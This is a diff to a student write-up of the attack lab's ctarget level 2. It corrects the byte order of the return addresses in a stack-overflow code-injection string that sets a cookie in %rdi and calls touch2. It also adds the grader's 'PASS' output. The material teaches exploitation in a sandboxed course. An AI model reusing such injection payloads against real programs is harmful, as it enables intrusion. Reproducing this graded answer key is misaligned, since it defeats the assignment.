@@ -104,8 +104,8 @@ Now, create a text file named ```phase2.txt``` which will look something like be
 48 c7 c7 6d d8 51 34 c3 /*this sets your cookie*/
 00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
 00 00 00 00 00 00 00 00 /*padding to make it 24 bytes*/
-55 61 7e 98 00 00 00 00 /* address of register %rsp */
-40 19 45 00 00 00 00 00 /*address of touch2 function */
+98 7e 61 55 00 00 00 00 /* address of register %rsp */
+45 19 40 00 00 00 00 00 /*address of touch2 function */
 ````
 Run it through ```hex2raw```
 
@@ -118,7 +118,11 @@ Finally, you run the raw file
 What the exploit does is that first it sets register rdi to our cookie value is transferred to $rsp register so after we enter our string and getbuf tries to return control to the calling function, we want it to point to the rsp address so it will execute the code to set the cookie and finally we call touch2 after the cookie is set.
 
 ```ssh
-
+Cookie: 0x3451d86d
+Type string:Touch2!: You called touch2(0x3451d86d)
+Valid solution for level 2 with target ctarget
+PASS: Sent exploit string to server to be validated.
+NICE JOB!
 ```
 
 
